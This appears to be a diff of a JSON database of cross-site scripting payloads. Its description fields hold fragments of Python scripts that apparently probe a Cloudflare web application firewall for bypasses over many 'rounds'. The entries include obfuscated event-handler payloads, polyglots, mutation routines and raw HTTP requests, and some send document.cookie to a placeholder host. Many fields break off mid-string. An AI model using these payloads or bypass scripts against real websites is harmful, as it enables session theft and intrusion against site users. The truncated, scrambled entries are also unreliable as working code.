       "description": "%20oNLy=1%20oNErrOR=prompt`1`//>',\n    \"shad0w-img-slashes\": '<img//////src=x oNlY=1 oNerror=alert(1)//',\n    \n    # N0t0d4y payloads\n    \"n0t0d4y-svg3\": '\"><svg+svg+svg\\\\/\\\\/On+OnLoAd=confirm(1)>',\n    \"n0t0d4y-img-plus\": '\"\\\\/<img%20s+src+c=x%20on+onerror+%20=\"alert(1)\"\\\\>',\n    \n    # BruteLogic autofocus pattern\n    \"brutelogic-autofocus\": '\"Onx=() AutOfOcUs OnfOCuS=prompt(document.cookie)>',\n    \n    # gprime31 collection\n    \"gprime-svg-on-space\": '<svg on =i onload=alert(domain)>',\n    \"gprime-svg-location\": '<svg/onload=location/**/=\"https://x/\"+document.domain>',\n    \"gprime-svg-optional\": '<svg onx=() onload=window.alert?.()>',\n    \"gprime-a-onclick\": '<a\"/onclick=(confirm)()>Click Here!',\n    \"gprime-img-import\": '<img src=x onError=import(\"//x/",
       "technique": "direct_injection",
       "source_file": "waf_round16.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0475",
@@ -1663,11 +1091,7 @@
       "description": "svg-svg-onload\": '<svg svg onload=alert(1)>',\n    \"svg-x-svg-onload\": '<svg x=svg onload=alert(1)>',\n    \n    # With slashes\n    \"svg-slash6-onload\": '<svg//////onload=alert(1)>',\n    \"img-slash6-onerror\": '<img//////src=x onerror=alert(1)>',\n    \"img-slash3-onerror\": '<img///src=x onerror=alert(1)>',\n    \n    # Fake attribute before real one (OnLuFy pattern)\n    \"svg-onlufy-onload\": '<svg/OnLuFy=\"X=y\"onload=alert(1)>',\n    \"svg-onfake-onload\": '<svg/onfake=\"x\"onload=alert(1)>',\n    \"svg-onxyz-onload\": '<svg onxyz=1 onload=alert(1)>',\n    \"img-onxyz-onerror\": '<img onxyz=1 src=x onerror=alert(1)>',\n    \n    # Plus signs as separators\n    \"svg-plus-onload\": '<svg+onload=alert(1)>',\n    \"img-plus-onerror\": '<img+src=x+onerror=alert(1)>',\n    \"img-s-src-c-onerror\": '<img%20s+src+c=x%20on+onerror+%20=alert(1)>',\n    \n    # XOR operator in JS value\n    \"svg-xor-confirm\": '<svg onload=;1^confirm(1)>',\n    \"svg-xor-alert\": '<svg onload=;1^alert(1)>',\n    \n    # Backtick after confirm\n    \"svg-backtick-confirm\": '<svg onload=confirm`1`>',\n    \n    # Comma trick\n    \"img-comma-onerror\": '<img src=\"data:x\",\"onerror=alert(1)//>',\n    \n    # All together\n    \"full-hernan\": '\"><sVg/OnLuFy=\"X=y\"oNloaD=;1^confirm(1)>/``^1//',\n    \"full-shad0w1\": '<img hrEF=\"x\" sRC=\"data:x\",\" oNLy=1 oNErrOR=prompt`1`//>',\n    \"full-shad0w2\": '<img//////src=x oNlY=1 oNerror=alert(1)//',\n}\n\nfor name, payload in stuffing.items():\n    test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"16F: JS Obfuscation Without alert/confirm/prompt",
       "technique": "obfuscation",
       "source_file": "waf_round16.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0476",
@@ -1677,11 +1101,7 @@
       "description": "func-template\": '<svg onload=Function`alert(1)`()>',\n    \"map-constructor\": '<svg onload=Map.constructor(\"alert(1)",
       "technique": "direct_injection",
       "source_file": "waf_round16.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0477",
@@ -1691,11 +1111,7 @@
       "description": "setinterval\": '<svg onload=setInterval`alert\\x281\\x29`>',\n    \n    # Indirect eval\n    \"indirect-eval\": '<svg onload=[][\"constructor",
       "technique": "direct_injection",
       "source_file": "waf_round16.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0479",
@@ -1705,11 +1121,7 @@
       "description": "location-data\": '<svg onload=location=\"data:text/html,<script>alert(1)</script>\">',\n    \n    # name property\n    \"eval-name\": '<svg onload=eval(name)>',\n    \"eval-window-name\": '<svg onload=eval(window.name)>',\n    \n    # Bracket notation\n    \"bracket-alert\": '<svg onload=self[\"ale\"+\"rt",
       "technique": "direct_injection",
       "source_file": "waf_round16.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0480",
@@ -1719,39 +1131,7 @@
       "description": "POST-shad0w\": '<img//////src=x oNlY=1 oNerror=alert(1)//',\n    \"POST-svg3\": '\"><svg+svg+svg\\\\/\\\\/On+OnLoAd=confirm(1)>',\n    \"POST-beforeinput\": '<input autofocus onbeforeinput=alert(1)>',\n    \"POST-spv\": '<div onsecuritypolicyviolation=alert(1)>x</div>',\n    \"POST-attr-beforeinput\": '\" autofocus onbeforeinput=alert(1) x=\"',\n    \"POST-autofocus\": '\"Onx=() AutOfOcUs OnfOCuS=prompt(document.cookie)>',\n}\n\nfor name, payload in post_best.items():\n    if \"attr\" in name:\n        test(name, {\"attributeHtml\": payload}, method=\"POST",
       "technique": "direct_injection",
       "source_file": "waf_round16.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0482",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg",
-      "description": "<SVG', '<img', '<IMG', '<script',\n                'onload=', 'onerror=', 'onfocus=', 'onclick=',\n                'javascript:",
-      "technique": "direct_injection",
-      "source_file": "waf_round53_56.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0484",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "svg\")}/onload=alert(1)>",
-      "description": "enc-full\": f'<{to_enclosed(\"svg",
-      "technique": "direct_injection",
-      "source_file": "waf_round53_56.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0488",
@@ -1761,11 +1141,7 @@
       "description": "sup-on-prefix\": f'<svg/{sup_on}load=alert(1)>',\n    \"sup-attr\": f'\" {sup_on}focus=alert(1) autofocus x=\"',\n}\n\nfor name, payload in sup_payloads.items():\n    if 'x=\"' in payload:\n        t(name, {\"attributeHtml\": payload})\n    else:\n        t(name, {\"globalHtml\": payload})\n    time.sleep(0.1)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 80)\nprint(\"54A: Latin Extended / IPA Characters",
       "technique": "direct_injection",
       "source_file": "waf_round53_56.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0490",
@@ -1775,11 +1151,7 @@
       "description": "NFD', 'NFKC', 'NFKD",
       "technique": "direct_injection",
       "source_file": "waf_round53_56.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0496",
@@ -1789,11 +1161,7 @@
       "description": "svg-oni-tagged-template\": '<svg/oni=on onload=alert`document.domain`>',\n\n    # Newer event names\n    \"svg-onscrollend\": '<svg onscrollend=alert(1)>',\n    \"div-onscrollend\": '<div onscrollend=alert(1) style=\"overflow:scroll;height:1px\">x<br><br></div>',\n    \"img-onloadstart\": '<img onloadstart=alert(1)>',\n\n    # Double event handler pattern\n    \"svg-double-on\": '<svg ononi=x onload=alert(1)>',\n    \"img-double-on\": '<img onoerror=x onerror=alert(1) src=x>',\n\n    # With Only= trick on different tags\n    \"video-only-oncanplay\": '<video Only=1 autoplay oncanplay=alert(1)><source src=x>',\n    \"audio-only-oncanplay\": '<audio Only=1 autoplay oncanplay=alert(1)><source src=x>',\n    \"marquee-only-onstart\": '<marquee Only=1 onstart=alert(1)>test',\n\n    # iframe srcdoc with known bypass\n    \"iframe-srcdoc-svg\": '<iframe srcdoc=\"<svg/oni=on onload=confirm(2)>\">',\n\n    # Object with javascript\n    \"object-oni\": '<object oni=on data=\"javascript:alert(1)\">',\n\n    # Combination: known bypass + encoding\n    \"svg-oni-mixed-case\": '<SvG/oNi=on oNlOaD=confirm(1)>',\n    \"svg-ONI-onload\": '<SVG/ONI=on ONLOAD=alert(1)>',\n}\n\nfor name, payload in mutations.items():\n    b, r, p = test(name, \"globalHtml\", payload)\n    if r: bypasses.append((\"HTML-MUT\", name, payload))\n    elif p: partials.append((\"HTML-MUT\", name, payload))\n\n# ════════════════════════════════════════════════════════════════════════════\n# SECTION 4: Edge-case encodings of known bypasses\n# ════════════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"SECTION 4: Encoding Variations",
       "technique": "obfuscation",
       "source_file": "waf_round4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0501",
@@ -1803,39 +1171,7 @@
       "description": "svg-onload-print-POST\": '<svg/onload=print()>',\n    \"img-onerror-print\": '<img src=x onerror=print()>',\n    \"input-onfocus-print\": '<input onfocus=print() autofocus>',\n    \"body-onload-print\": '<body onload=print()>',\n    \"details-ontoggle-print\": '<details open ontoggle=print()>',\n    \n    # Gap events + print() on tags\n    \"svg-on{load-print\": '<svg on{load=print()>',\n    \"img-on{error-print\": '<img src=x on{error=print()>',\n    \"input-on{focus-print\": '<input on{focus=print() autofocus>',\n    \n    # Self-close + gap + print\n    \"sc-svg-on{load-print\": '\"/><svg on{load=print()>',\n    \"sc-img-on{error-print\": '\"/><img src=x on{error=print()>',\n    \"sc-input-on{focus-print\": '\"/><input on{focus=print() autofocus>',\n}\n\nfor name, payload in global_print.items():\n    if \"sc-\" in name:\n        param = \"attributeHtml\"\n    else:\n        param = \"globalHtml\"\n    \n    # POST\n    try:\n        r = requests.post(BASE, data={param: payload},\n                         verify=False, timeout=TIMEOUT)\n        blocked = r.status_code in (403, 406, 503)\n        reflected = False\n        if not blocked:\n            lower = r.text.lower()\n            reflected = ('onload=print' in lower or 'onerror=print' in lower or \n                        'onfocus=print' in lower or 'on{load=print' in lower or\n                        'on{error=print' in lower or 'on{focus=print' in lower)\n        mark = \" *** REFLECTED ***\" if reflected else \" PASS\" if not blocked else \" BLOCK\"\n        if reflected: found.append(f\"POST-{name}",
       "technique": "direct_injection",
       "source_file": "waf_round45_print_verify.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0510",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg/onload=alert(1)>",
-      "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '\"><svg/onload=alert(1)>',\n    \"javascript:alert(1)\",\n]\n\nfor p in path_payloads:\n    enc = urllib.parse.quote(p)\n    # In path\n    raw_req(f\"GET /{enc} HTTP/1.1\\r\\nHost: {HOST}\\r\\nConnection: close\\r\\n\\r\\n\".encode())\n    # In path + query\n    raw_req(f\"GET /{enc}?x=1 HTTP/1.1\\r\\nHost: {HOST}\\r\\nConnection: close\\r\\n\\r\\n\".encode())\n    # Double-encoded in path\n    raw_req(f\"GET /{urllib.parse.quote(enc)} HTTP/1.1\\r\\nHost: {HOST}\\r\\nConnection: close\\r\\n\\r\\n\".encode())\n    # In fragment (unusual)\n    raw_req(f\"GET /#{enc} HTTP/1.1\\r\\nHost: {HOST}\\r\\nConnection: close\\r\\n\\r\\n\".encode())\n\nprint(f\"  69F done: {total} total",
-      "technique": "encoding",
-      "source_file": "waf_round69_mass2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0511",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg/onload=alert(1)>",
-      "description": "<img src=x onerror=alert(1)>', '\" onfocus=alert(1) autofocus x=\"",
-      "technique": "direct_injection",
-      "source_file": "waf_round69_mass2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0512",
@@ -1845,11 +1181,7 @@
       "description": "<?xml version=\"1.0\"?><root><globalHtml><![CDATA[<svg/onload=alert(1)>]]></globalHtml></root>',\n    '<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><globalHtml><svg/onload=alert(1)></globalHtml></soap:Body></soap:Envelope>',\n    '<!DOCTYPE foo [<!ENTITY xxe \"<svg/onload=alert(1)>\">]><root>&xxe;</root>',\n    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"javascript:alert(1)\">]><root>&xxe;</root>',\n]\n\nfor xbody in xml_payloads:\n    for ct in ['application/xml', 'text/xml', 'application/soap+xml",
       "technique": "direct_injection",
       "source_file": "waf_round69_mass2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0525",
@@ -1859,11 +1191,7 @@
       "description": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15\",\n    \"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0\",\n    \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1\",\n]\n\nSEC_CH_UA = [\n    '\"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\", \"Not-A.Brand\";v=\"99\"',\n    '\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"',\n    '\"Firefox\";v=\"121\"',\n]\n\nSTEALTH_PAYLOADS = [\n    '<svg/onload=alert(1)>',\n    '<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<Img/Src/OnError=(alert)(1)>',\n    '<img src=OnErRor OnErRor=(alert)(1)>',\n    '<svg onx=() onload=window.alert?.()>',\n    '<img hrEF=\"x\" sRC=\"data:x,\" oNLy=1 oNErrOR=prompt`1`>',\n    '<!--><svg+onload=top[/al/.source+/ert/.source](1)>',\n    '<details/open/ontoggle=\"self[\\'ale\\'+\\'rt\\",
       "technique": "direct_injection",
       "source_file": "waf_round75_cross_waf.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0530",
@@ -1873,11 +1201,7 @@
       "description": "location-href\": '<svg onload=location.href=\"//x\">',\n    \"document-write\": '<svg onload=document.write(1)>',\n    \"document-domain-set\": '<svg onload=document.domain=\"x\">',\n\n    # Fetch (no dangerous function name)\n    \"fetch-exfil\": '<svg onload=fetch(\"//x/\"+document.cookie)>',\n    \"fetch-simple\": '<svg onload=fetch(\"//x",
       "technique": "direct_injection",
       "source_file": "waf_round5.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0531",
@@ -1887,11 +1211,7 @@
       "description": "css-bg-url\": '<div style=\"background:url(//x)\">',\n\n    # Meta redirect (no JS)\n    \"meta-redirect\": '<meta http-equiv=refresh content=\"0;url=//x\">',\n\n    # Link preload\n    \"link-preload\": '<link rel=preload href=\"//x\" as=fetch>',\n\n    # Form action exfil\n    \"form-exfil\": '<form action=\"//x\"><input name=q value=data><input type=submit></form>',\n\n    # Anchor navigation\n    \"anchor-ping\": '<a href=# ping=\"//x\">click</a>',\n\n    # Image beacon\n    \"img-beacon\": '<img src=\"//x/test.gif\">',\n\n    # No function call at all — just property access\n    \"toString-trigger\": '<img src=x onerror=this.src=\"//x/\"+document.cookie>',\n\n    # Assignment instead of function call\n    \"innerhtml-assign\": '<img src=x onerror=document.body.innerHTML=\"pwned\">',\n\n    # Prototype chain\n    \"proto-func\": '<img src=x onerror=Object.constructor(\"return alert(1)",
       "technique": "direct_injection",
       "source_file": "waf_round5.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0532",
@@ -1901,11 +1221,7 @@
       "description": "jpf-cr\": '<svg%0donload=alert(1)>',\n    \"jpf-lf\": '<svg%0aonload=alert(1)>',\n    \"jpf-tab\": '<svg%09onload=alert(1)>',\n    \"jpf-space\": '<svg%20onload=alert(1)>',\n    # Chunk boundary simulation\n    \"chunk-sim\": 'x' * 8000 + '<svg onload=alert(1)>',\n    # Parameter with array notation\n    \"array-param\": '<svg onload=alert(1)>',\n}\n\nfor name, payload in multi_enc.items():\n    test(name, \"globalHtml\", payload)\n\n# Test array-style parameter names\ntest(\"param-array-0\", \"globalHtml[]\", \"<svg onload=alert(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round5.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0546",
@@ -1915,11 +1231,7 @@
       "description": "attributeHtml\": '\" popovertarget=xp x=\"',\n    },\n    # globalHtml: bare text with ontoggle, attr: popover\n    \"split-ontoggle-pop\": {\n        \"globalHtml\": \"ontoggle=alert(1)\",\n        \"attributeHtml\": '\" popover x=\"',\n    },\n    # globalHtml: div with popover id (if it passes separately)\n    \"split-div-pop-g\": {\n        \"globalHtml\": '<div popover id=xp>popup</div>',\n        \"attributeHtml\": '\" popovertarget=xp x=\"',\n    },\n    # globalHtml: math mtext with popover target inside\n    \"split-mtext-pop\": {\n        \"globalHtml\": '<math><mtext><div popover id=xp>popup</div></mtext></math>',\n        \"attributeHtml\": '\" popovertarget=xp x=\"',\n    },\n}\n\nfor name, params in split_pop.items():\n    test(name, params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"13F: Abuse ontoggle/onbeforetoggle Passing in globalHtml",
       "technique": "direct_injection",
       "source_file": "waf_round13.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0556",
@@ -1929,11 +1241,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<details open ontoggle=alert(1)>',\n    '<input onfocus=alert(1) autofocus>',\n    '<body onload=alert(1)>',\n    '<a href=\"javascript:alert(1)\">x</a>',\n    '<iframe src=\"javascript:alert(1)\">',\n]\n\nMUTATION_OPS = [\n    # Case toggle\n    lambda p: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in p),\n    # Whitespace to tab\n    lambda p: p.replace(' ', '\\t', random.randint(1, p.count(' ",
       "technique": "obfuscation",
       "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0599",
@@ -1943,25 +1251,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<details open ontoggle=alert(1)>',\n    '<input onfocus=alert(1) autofocus>',\n    '<body onload=alert(1)>',\n]\n\nMUTS = [\n    lambda p: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in p),\n    lambda p: p.replace(' ', '\\t', 1),\n    lambda p: p.replace(' ', '\\n', 1),\n    lambda p: p.replace(' ', '\\x0c', 1),\n    lambda p: p.replace(' ', '/', 1),\n    lambda p: p.replace('(', '&#40;",
       "technique": "direct_injection",
       "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0613",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg/onload=alert(1)>",
-      "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>', '<details open ontoggle=alert(1)>',\n    '<input onfocus=alert(1) autofocus>', '<body onload=alert(1)>',\n    '<marquee onstart=alert(1)>', '<video src=x onerror=alert(1)>',\n    '<select autofocus onfocus=alert(1)>', '<textarea autofocus onfocus=alert(1)>',\n]\n\nFUNCS = [\n    'alert(1)', 'confirm(1)', 'prompt(1)', 'print()',\n    'alert`1`', 'eval(atob(\"YWxlcnQoMSk=",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0615",
@@ -1971,11 +1261,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0622",
@@ -1985,11 +1271,7 @@
       "description": "attributeHtml\": '\" onfocus=alert(1) autofocus x=\"'\n    },\n    # Math in globalHtml, event in attribute\n    \"split-math-event\": {\n        \"globalHtml\": '<math>',\n        \"attributeHtml\": '\" onfocus=alert(1) tabindex=1 x=\"'\n    },\n    # Script in global, close in attr\n    \"split-script-parts\": {\n        \"globalHtml\": '<script>alert(1)</',\n        \"attributeHtml\": 'script>'\n    },\n    # Both benign individually\n    \"split-safe-parts\": {\n        \"globalHtml\": '<math>',\n        \"attributeHtml\": '\" class=x x=\"'\n    },\n}\n\nfor name, params in split.items():\n    test(name, params, show_body=True)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"FINAL SUMMARY — ROUND 9",
       "technique": "direct_injection",
       "source_file": "waf_round9_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0625",
@@ -1999,11 +1281,7 @@
       "description": "poly2\": 'javascript:\"/*\\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\\\" onmouseover=/*<svg/*/onload=alert()//>',\n    \"poly3\": \"javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/\\\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\",\n}\n\nfor name, payload in polyglots.items():\n    test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"17D: accesskey + onclick (browser shortcut trigger)",
       "technique": "polyglot",
       "source_file": "waf_round17.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0629",
@@ -2013,11 +1291,7 @@
       "description": "svg-set-href\": '<svg><a><set attributeName=href to=javascript:alert(1) /><text>click</text></a></svg>',\n    # SVG animate xlink:href\n    \"svg-animate-xlink\": '<svg><a><animate attributeName=xlink:href values=javascript:alert(1) /><text>click</text></a></svg>',\n    # SVG animate with entity encoding\n    \"svg-animate-entity\": '<svg><a><animate attributeName=href values=&#106;avascript:alert(1) /><text>click</text></a></svg>',\n}\n\nfor name, payload in svg_animate.items():\n    test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"17I: Niche Payloads (recent discoveries)",
       "technique": "direct_injection",
       "source_file": "waf_round17.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     }
   ]
 }
